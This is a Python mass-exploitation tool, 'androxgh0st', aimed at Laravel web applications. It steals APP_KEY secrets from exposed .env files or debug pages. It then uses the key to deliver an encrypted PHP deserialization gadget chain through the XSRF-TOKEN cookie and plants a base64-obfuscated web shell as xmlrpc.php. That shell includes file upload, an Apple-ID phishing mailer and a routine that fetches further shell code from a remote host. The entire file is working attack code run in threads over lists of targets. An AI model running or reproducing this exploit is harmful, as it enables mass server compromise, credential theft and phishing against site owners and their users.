# -*- coding: utf-8 -*-
''' So many people who love you. Don't focus on the people who don't. xD '''

import hmac, hashlib, json, requests, re, threading, time, random, sys, os
requests.packages.urllib3.disable_warnings()
from hashlib import sha256
from base64 import b64decode
from base64 import b64encode
from Crypto import Random
from Crypto.Cipher import AES
from Queue import Queue
from threading import Thread


# Payload configure
pathname = 'xmlrpc.php'
p = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!"); $code = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwoKaWYoaXNzZXQoJF9HRVRbIms0bDBuayJdKSkgewoJJHJvb3QgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoJZWNobyAiPGgxPjxpPms0bDBuayA8MzwvaT48L2gxPjxicj4iOwoJZWNobyAiPGI+PHBocHVuYW1lPiIucGhwX3VuYW1lKCkuIjwvcGhwdW5hbWU+PC9iPjxicj4iOwoJZWNobyAiPCEtLSA8Yj48ZG9jcm9vdD4iLiRyb290LiI8L2RvY3Jvb3Q+PC9iPjxicj4gLS0+IjsKCWVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+CgkJICA8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naWR4X2ZpbGUnPgoJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndXBsb2FkJyB2YWx1ZT0ndXBsb2FkJz4KCQkgIDwvZm9ybT4iOwoJJGZpbGVzID0gJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddOwoJJGRlc3QgPSAkcm9vdC4nLycuJGZpbGVzOwoJaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsKCQlpZihpc193cml0YWJsZSgkcm9vdCkpIHsKCQkJaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJGRlc3QpKSB7CgkJCQkkd2ViID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXTsKCQkJCWVjaG8gIlN1a3NlcyAtPiA8YSBocmVmPSckd2ViLyRmaWxlcycgdGFyZ2V0PSdfYmxhbmsnPjxiPjx1PiR3ZWIvJGZpbGVzPC91PjwvYj48L2E+IjsKCQkJfSBlbHNlIHsKCQkJCWVjaG8gImdhZ2FsIHVwbG9hZCBkaSBkb2N1bWVudCByb290LiI7CgkJCX0KCQl9IGVsc2UgewoJCQlpZihAY29weSgkX0ZJTEVTWydpZHhfZmlsZSddWyd0bXBfbmFtZSddLCAkZmlsZXMpKSB7CgkJCQllY2hvICJzdWtzZXMgdXBsb2FkIDxiPiRmaWxlczwvYj4gZGkgZm9sZGVyIGluaSI7CgkJCX0gZWxzZSB7CgkJCQllY2hvICJnYWdhbCB1cGxvYWQiOwoJCQl9CgkJfQoJfQp9IGVsc2VpZihpc3NldCgkX0dFVFsiY2VrYXdzIl0pKXsKCSRob21lZSA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107CgkkY2dmcyA9IGV4cGxvZGUoIi8iLCRob21lZSk7CgkkYnVpbGQgPSAnLycuJGNnZnNbMV0uJy8nLiRjZ2ZzWzJdLicvLmNhZ2Vmcyc7CglpZihpc19kaXIoJGJ1aWxkKSkgewoJCWVjaG8oIkNsb3VkTGludXggPT4gVHJ1ZSIpOwoJfSBlbHNlIHsKCQllY2hvKCJDbG91ZExpbnV4ID0+IEZhbHNlIik7Cgl9CgoJaWYoc3RycG9zKCdwdWJsaWMnLCAkaG9tZWUpID09IFRydWUpIHsKCQkkZGlycyA9IHN0cl9yZXBsYWNlKCJwdWJsaWMiLCAiIiwgJGhvbWVlKS4iL3ZlbmRvci9hd3MiOwoJCSRkaXJzMiA9IHN0cl9yZXBsYWNlKCJwdWJsaWMiLCAiIiwgJGhvbWVlKS4iL3ZlbmRvci9hd3Mtc2RrLXBocCI7CgkJaWYoaXNfZGlyKCRkaXJzKSkgewoJCQllY2hvKCc8YnI+QVdTIFNESyA9PiBUcnVlJyk7CgkJfQoJCWVsc2VpZihpc19kaXIoJGRpcnMyKSkgewoJCQllY2hvKCc8YnI+QVdTIFNESyA9PiBUcnVlJyk7CgkJfQoJCWVsc2UgewoJCQllY2hvKCc8YnI+QVdTIFNESyA9PiBGYWxzZScpOwoJCX0KCX0gZWxzZSB7CgkJJGRpcnMgPSAkaG9tZWUuIi92ZW5kb3IvYXdzIjsKCQkkZGlyczIgPSAkaG9tZWUuIi92ZW5kb3IvYXdzLXNkay1waHAiOwoJCWlmKGlzX2RpcigkZGlycykpIHsKCQkJZWNobygnPGJyPkFXUyBTREsgPT4gVHJ1ZScpOwoJCX0KCQllbHNlaWYoaXNfZGlyKCRkaXJzMikpIHsKCQkJZWNobygnPGJyPkFXUyBTREsgPT4gVHJ1ZScpOwoJCX0KCQllbHNlIHsKCQkJZWNobygnPGJyPkFXUyBTREsgPT4gRmFsc2UnKTsKCQl9Cgl9Cgp9IGVsc2VpZiAoaXNzZXQoJF9HRVRbJ3NwcmVhZCddKSkgewoJZXZhbChiYXNlNjRfZGVjb2RlKCdablZ1WTNScGIyNGdZV1J0YVc1bGNpZ2tkWEpzTENBa2FYTnBLU0I3Q2lBZ0lDQWdJQ0FnSkdad0lEMGdabTl3Wlc0b0pHbHphU3dnSW5jaUtUc0tJQ0FnSUNBZ0lDQWtZMmdnUFNCamRYSnNYMmx1YVhRb0tUc0tJQ0FnSUNBZ0lDQmpkWEpzWDNObGRHOXdkQ2drWTJnc0lFTlZVa3hQVUZSZlZWSk1MQ0FrZFhKc0tUc0tJQ0FnSUNBZ0lDQmpkWEpzWDNObGRHOXdkQ2drWTJnc0lFTlZVa3hQVUZSZlFrbE9RVkpaVkZKQlRsTkdSVklzSUhSeWRXVXBPd29nSUNBZ0lDQWdJR04xY214ZmMyVjBiM0IwS0NSamFDd2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl3Z2RISjFaU2s3Q2lBZ0lDQWdJQ0FnWTNWeWJGOXpaWFJ2Y0hRb0pHTm9MQ0JEVlZKTVQxQlVYMU5UVEY5V1JWSkpSbGxRUlVWU0xDQm1ZV3h6WlNrN0NpQWdJQ0FnSUNBZ1kzVnliRjl6WlhSdmNIUW9KR05vTENCRFZWSk1UMUJVWDBaSlRFVXNJQ1JtY0NrN0NpQWdJQ0FnSUNBZ2NtVjBkWEp1SUdOMWNteGZaWGhsWXlna1kyZ3BPd29nSUNBZ0lDQWdJR04xY214ZlkyeHZjMlVvSkdOb0tUc0tJQ0FnSUNBZ0lDQm1ZMnh2YzJVb0pHWndLVHNLSUNBZ0lDQWdJQ0J2WWw5bWJIVnphQ2dwT3dvZ0lDQWdJQ0FnSUdac2RYTm9LQ2s3Q24wS2FXWW9ZV1J0YVc1bGNpZ25hSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwyczBiREJ1YXk5emFETnNiQzl0WVdsdUwzaHRiQzV3YUhBbkxDZDRiV3d1Y0dod0p5a3BJSHNLSUNBZ0lDQWdJQ0JsWTJodklDSnJOR3d3Ym1zaU93cDlJR1ZzYzJVZ2V3b2dJQ0FnSUNBZ0lHVmphRzhnSW14dlkyRnNhRzl6ZENJN0NuMD0nKSk7Cn0gZWxzZWlmIChpc3NldCgkX0dFVFsiZW1haWwiXSkpIHsKCSRuYW1lID0gIkFwcGxlIjsgJHRvID0gJF9HRVRbImVtYWlsIl07ICR3ZWI9IiRfU0VSVkVSW0hUVFBfSE9TVF0iOyAKCSRzdWJqZWN0ID0gIllvdXIgQXBwbGUgSUQgd2FzIHVzZWQgdG8gc2lnbiBpbiB0byBpQ2xvdWQgdmlhIGEgd2ViIGJyb3dzZXIiOyAKCSRlbWFpbCA9ICJBcHBsZUAkd2ViIjsgCgkkaGVhZGVycyA9ICdGcm9tOiAnIC4KCSRlbWFpbCAuICJcclxuIi4gCgkkaGVhZGVycyA9ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxyXG4iOyAnUmVwbHktVG86ICcgLiAKCSRlbWFpbC4gIlxyXG4iIC4gJ1gtTWFpbGVyOiBQSFAvJyAuIHBocHZlcnNpb24oKTsgCglpZiAobWFpbCgkdG8sCgkkc3ViamVjdCwKCSRib2R5LAoJJGhlYWRlcnMsJG5hbWUpKSAKCXsgZWNobygiRW1haWwgc2VudCB0byA9PiAkdG8iKTsgCgl9IGVsc2UgCgl7IAoJZWNobygiTm90IHN1cHBvcnQgZm9yIG1haWxlciIpOyB9Cn0gZWxzZSB7CgloZWFkZXIoJ0hUVFAvMS4xIDQwMyBGb3JiaWRkZW4nKTsKfQo/Pg=="; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("k4l0nk <3");'
exploit_code = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(p)) + ':"' + p + '";}}}}'

# Preparing
BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
				chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception, e: print e
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()


class androxgh0st:
	''' There is no failure except in no longer trying. xD '''  
	def encrypt(self, raw, key):
		raw = pad(raw)
		iv = Random.new().read(AES.block_size)
		cipher = AES.new(key, AES.MODE_CBC, iv)
		rawco = cipher.encrypt(raw)
		mac = hmac.new(key, b64encode(iv)+b64encode(rawco), hashlib.sha256).hexdigest()
		value = b64encode(rawco)
		iv = b64encode(iv)
		data = {}
		data['iv'] = str(iv)
		data['value'] = str(value)
		data['mac'] = str(mac)
		json_data = json.dumps(data)
		return  json_data

	def get_env(self, text, url):
		#headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		#text = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
		if "APP_KEY" in text:
			if "APP_KEY=" in text:
				appkey = re.findall("APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)", text)[0]
			else:
				#text = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
				if "<td>APP_KEY</td>" in text:
					appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
			if appkey:
				if '"' in appkey or "'" in appkey:
					appkey = appkey[1:-1]
				return appkey
			else:
				return False
		else:
			return False

def printf(text):
	''.join([str(item) for item in text])
	print(text + '\n'),

def exploit(url):
	asu = url
	resp = False
	try:
		text = '\033[32;1m#\033[0m '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
			method = 'vuln_dotenv.txt'
		else:
			get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
				resp = get_source
				method = 'vuln_postdata.txt'
		if resp:
			getkey = androxgh0st().get_env(resp, url)
			if getkey:
				savekey = open(method,'a')
				savekey.write(url + '|' + getkey + '\n')
				savekey.close()
				api_key = getkey.replace('base64:', '')
				key = b64decode(api_key)
				xnxx = androxgh0st().encrypt(exploit_code, key)
				matamu = b64encode(str(xnxx))
				cokk = {"XSRF-TOKEN": matamu}
				curler = requests.get(url+'/public', cookies=cokk, verify=False, timeout=8, headers=headers).text
				y = curler.split("</html>")[1]
				if "Chitoge kirisaki?! Tsundere,kawaii <3" not in y:
					curler = requests.get(url+'/', cookies=cokk, verify=False, timeout=8, headers=headers).text
				asu =  requests.get(url + '/'+pathname+'?Chitoge', verify=False, timeout=8, headers=headers, allow_redirects=False).text
				if "Unknown error<br>" in asu:
					text += " | \033[32;1mSuccess can't spawn shell\033[0m"
					save = open('cant_spawn_shell.txt','a')
					save.write(url)
					save.close()
				else:
					cekshell = requests.get(url + '/'+pathname+'?Chitoge', verify=False, timeout=8, headers=headers).text
					if 'Chitoge kirisaki' in cekshell:
						text += " | \033[32;1mSuccess\033[0m"
						save = open('shell_results.txt','a')
						save.write(url + '/'+pathname+'?Chitoge\n')
						save.close()
					else:
						text += " | \033[31;1mCan't exploit\033[0m"
			else:
				text += " | \033[31;1mCan't get APP_KEY\033[0m"
				savekey = open('cant_getkey.txt','a')
				savekey.write(url + '\n')
				savekey.close()
		else:
			text += " | \033[31;1mCan't get APP_KEY using .env or debug mode\033[0m"
			savekey = open('not_vuln.txt','a')
			savekey.write(url + '\n')
			savekey.close()
	except KeyboardInterrupt:
		exit()
	except Exception as err:
		text += " | \033[31;1mError: "+str(err)+"\033[0m"
		savekey = open('site_error.txt','a')
		savekey.write(url + '\n')
		savekey.close()
	printf(text)

try:
	lists = sys.argv[1]
except:
	print('''How to use:
	- python rce.py check [url] <- for single target
	- python rce.py [filelist] [thread] <- mass exploit

''')
	exit()

if lists == "check":
	url = sys.argv[2]
	exploit(url)
	exit()

numthread = sys.argv[2]
pool = ThreadPool(int(numthread))
readsplit = open(lists).read().splitlines()
for url in readsplit:
	if "://" in url:
		url = url
	else:
		url = "http://"+url
	pool.add_task(exploit, url)
pool.wait_completion()
